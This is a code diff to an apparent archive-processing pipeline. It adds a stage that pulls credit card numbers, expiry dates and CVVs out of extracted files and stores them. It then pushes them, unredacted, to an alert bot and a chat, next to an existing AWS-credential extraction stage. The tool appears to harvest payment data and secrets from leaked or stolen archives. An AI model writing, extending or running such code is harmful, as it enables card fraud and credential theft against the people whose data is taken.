@@ -21,6 +21,7 @@ from config import Settings, load_settings
 from database_manager import DatabaseManager, Job
 from extractor import ArchiveProcessor
 from parse_credentials import scan_tree, write_results, extract_raw_credentials
+from parse_credit_cards import extract_credit_cards, format_credit_card_line, write_credit_cards_file
 from password_store import PasswordStore
 from session_store import SessionStore
 from secure_logging import configure_logging
@@ -436,6 +437,43 @@ class Pipeline:
                 'creds_count': len(raw_creds),
                 'files_with_creds': unique_files,
                 'stage': 'cred-alert',
+            },
+        )
+
+    async def alert_credit_cards(self, job: Job, cards: list[dict]) -> None:
+        """Persist + push found credit cards to the alert bot whenever configured."""
+        if not cards:
+            return
+        await asyncio.to_thread(self.db.save_credit_cards, job.id, cards)
+        cards_file = self.s.output_dir / f'credit-cards-{job.message_id}.txt'
+        card_lines = [format_credit_card_line(card) for card in cards]
+        await asyncio.to_thread(
+            lambda: (
+                write_credit_cards_file(cards, cards_file),
+            )
+        )
+        unique_files = len({c['file'] for c in cards})
+        source = job.source_link or job.source or 'job'
+        caption = (
+            f"💳 Credit cards found\n"
+            f"Job #{job.id}\n"
+            f"Source: {source}\n"
+            f"Count: {len(cards)}\n"
+            f"Files: {unique_files}"
+        )
+        sent = await self.notify_cred_bot(caption, document=cards_file)
+        if not sent:
+            body = caption + "\n\n" + "\n".join(card_lines)
+            for start in range(0, len(body), 3500):
+                await self.notify_cred_bot(body[start:start + 3500])
+        LOG.info(
+            'Credit cards extracted and alerted',
+            extra={
+                'job_id': job.id,
+                'message_id': job.message_id,
+                'cards_count': len(cards),
+                'files_with_cards': unique_files,
+                'stage': 'credit-card-alert',
             },
         )
 
@@ -1073,6 +1111,24 @@ class Pipeline:
                 if job.chat_id:
                     await self.notify(job.chat_id,'⚠️ No raw AWS credentials found in extracted files',job.message_id)
                 LOG.info('No raw credentials found',extra={'job_id':job.id,'message_id':job.message_id,'stage':'processing'})
+
+            await self.notify(job.chat_id,'💳 Scanning for credit cards…',job.message_id)
+            raw_cards=await asyncio.to_thread(
+                extract_credit_cards, root, 8, self.s.output_dir, self.s.max_scan_file_bytes
+            )
+            if raw_cards:
+                await self.alert_credit_cards(job, raw_cards)
+                if job.chat_id:
+                    cards_msg=(
+                        f"💳 Credit cards extracted (cardnum|month|year|cvv)\n"
+                        f"📊 Total cards found: {len(raw_cards)}\n"
+                        f"📁 Files containing cards: {len(set(c['file'] for c in raw_cards))}"
+                    )
+                    await self.notify(job.chat_id, cards_msg, job.message_id)
+            else:
+                if job.chat_id:
+                    await self.notify(job.chat_id,'⚠️ No credit cards found in extracted files',job.message_id)
+                LOG.info('No credit cards found', extra={'job_id': job.id, 'message_id': job.message_id, 'stage': 'processing'})
             
             # Send redacted reports (best-effort — chat bans must not fail a completed scan).
             if job.chat_id and self.client is not None:
